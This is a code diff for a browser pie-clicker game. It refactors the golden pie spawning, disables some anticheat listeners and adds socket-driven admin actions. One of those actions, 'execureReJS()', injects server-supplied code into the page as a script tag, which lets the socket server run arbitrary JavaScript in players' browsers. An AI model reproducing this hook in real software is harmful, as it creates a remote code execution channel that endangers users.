@@ -24,6 +24,7 @@ hasSeenCreditsThisSession  = false
 ticksUntilMSGFades         = 0
 doSaveGame                 = true
 hasPageInteracted          = false
+goldenPieID                = 0
 /*     Anticheat Variables    */
 oldPiex                    = -1
 oldPiey                    = -1
@@ -65,6 +66,18 @@ socket.on('PCA',function(msg){
 	if(msg.action=='forceReload()'){
 		if(doSaveGame)saveGame()
 		window.location.reload()
+	}if(msg.action=='messageGame()'){
+		messageGame(msg.msg,3)
+	}if(msg.action=='rewardPlars()'){
+		pies=pies+msg.amount*1
+		messageGame("You Just Got +"+msg.amount+" Pies!",3)
+	}if(msg.action=='banAllPlars()'){
+		banMessage()
+	}if(msg.action=='goldenPieYW()'){
+		goldenPie()
+	}if(msg.action=='execureReJS()'){
+		var z=`<script>${msg.code}</script>`
+		$('body').append(z)
 	}
 })
 
@@ -677,36 +690,41 @@ function lsExists(key){
 	else return true
 }
 
-async function goldenPie(){
-	if(!$('#goldenPie').length&&pies>=50){
-		$('#goldenPie').remove()
+function goldenPie(){
+	if(pies>=50){
 		a=$(document).width()-$(document).width()*0.1
 		b=$(document).height()-$(document).height()*0.1
 		c=0
 		d=getRndInteger(4,8)
 		x=getRndInteger(0,a)
 		y=getRndInteger(0,b)
-		z=`<div id="goldenPie" style="position:fixed;left:${x}px;top:${y}px;height:${d}%;width:auto;display:none;cursor:pointer;" onclick="goldenPieFunc()">
+		z=`<div id="goldenPie${goldenPieID}" style="position:fixed;left:${x}px;top:${y}px;height:${d}%;width:auto;display:none;cursor:pointer;" onclick="goldenPieFunc(this)">
 			<img src="./assets/GoldenPie.png" style="width:100%;height:100%;">
 		</div>`
 		$('body').append(z)
-		for(i=0;i<501;i++){
-			if(i==0)$('#goldenPie').fadeIn(500)
-			$('#goldenPie').css({"transform":"rotate("+c+"deg)"})
-			await sleep(15)
-			c=c+0.75
-			if(i==350)$('#goldenPie').fadeOut(1000)
-		}
-		await sleep(500)
-		$('#goldenPie').remove()
+		gp=$('#goldenPie'+goldenPieID)
+		gp.fadeIn(500)
+		goldenPieID=goldenPieID+1
+		goldenPieSpin(gp)
 	}
 }
 
-async function goldenPieFunc(){
-	$('#goldenPie').attr({"onclick":""})
-	$('#goldenPie').fadeOut(250)
+async function goldenPieSpin(elem){
+	for(i=0;i<501;i++){
+		elem.css({"transform":"rotate("+c+"deg)"})
+		await sleep(15)
+		c=c+0.75
+	}
+	elem.fadeOut(500)
+	await sleep(500)
+	elem.remove()
+}
+
+async function goldenPieFunc(elem){
+	$(elem).attr({"onclick":""})
+	$(elem).fadeOut(250)
 	await sleep(100)
-	$('#goldenPie').remove()
+	$(elem).remove()
 	w=getRndInteger(round(pies/4),round(pies/2))
 	pies=pies+w
 	messageGame("Lucky! +"+piesToNumber(w)+" pies!")
@@ -742,10 +760,8 @@ function resetGame(){
 	confirmationBox("Reset Game?","Yes","No","localStorage.clear();window.location.reload()","$('#popupMenu').fadeOut(500)")
 }
 
-window.addEventListener("blur",()=>{Anticheat.pageFocused=0})
-window.addEventListener("focus",()=>{Anticheat.pageFocused=1})
-window.addEventListener("storage",()=>{Anticheat.storageEditA=1})
-window.addEventListener("resize",()=>{if(initalPageWidth!=$(document).width()){Anticheat.isOGWidth=0}else{Anticheat.isOGWidth=1}})
+//window.addEventListener("blur",()=>{Anticheat.pageFocused=0})
+//window.addEventListener("focus",()=>{Anticheat.pageFocused=1})
 
 function Anticheat(){CLog("Anticheat Started")}
 
@@ -831,3 +847,11 @@ Anticheat.prototype={
 }
 
 //Anticheat=new Anticheat()
+
+function banMessage(){
+	$('#copyPasteLogo').attr('src','./assets/antiCheatLogo.png')
+	$('#copyPasteLogo').fadeIn(225)
+	$('#is_centerV').css({"top":"20%"})
+	$('#cheatingText').fadeIn(250)
+	$('#introScreen').fadeIn(200)
+}
